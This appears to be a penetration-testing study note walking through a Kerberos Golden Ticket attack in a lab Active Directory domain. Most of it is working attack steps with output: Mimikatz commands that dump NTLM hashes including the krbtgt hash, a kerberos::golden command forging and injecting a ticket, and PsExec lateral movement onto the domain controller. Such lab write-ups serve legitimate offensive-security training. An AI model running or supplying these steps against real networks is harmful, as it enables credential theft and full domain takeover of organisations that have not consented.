# Golden Ticket

## Recap

When a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), the KDC encrypts the TGT with a secret only known to the KDC. **The secret is actually the password hash to the user:&#x20;**_<mark style="color:yellow;">**krbtgt.**</mark>_

_**If we get our hands on the****&#x20;**<mark style="color:yellow;">**krbtgt**</mark>**&#x20;****password hash we can create our own self made TGT tickets, know as****&#x20;**<mark style="color:yellow;">**a Golden Tickets.**</mark>_



### Golden Ticket vs Silver Ticket

Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets are a much more powerful attack vector that gives us access to the entire domain.

<mark style="color:red;">**NOTE:**</mark> We must carefully protect stolen _krbtgt_ password hashes because they grant unlimited domain access.&#x20;



## Prerequisites

For a successful attack we need the following:

* Access to Domain Admin account or compromised Domain Controller.



## Attack

## Attempting to laterally move

We will try to laterally move with our current ticket. We are **denied access.**

```powershell
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```



### Launching Mimikatz

With access to Domain Admin we can extract the password hash of krbtgt

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
```



### Creating Golden Ticket & Injecting to Memory

Next we can create the Golden Ticket & Inject it into memory

```powershell
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
```



### Verifying Success

We can try to laterally move now and verify we have successfully completed the attack

```powershell
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
   IPv4 Address. . . . . . . . . . . : 192.168.50.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32>whoami
```
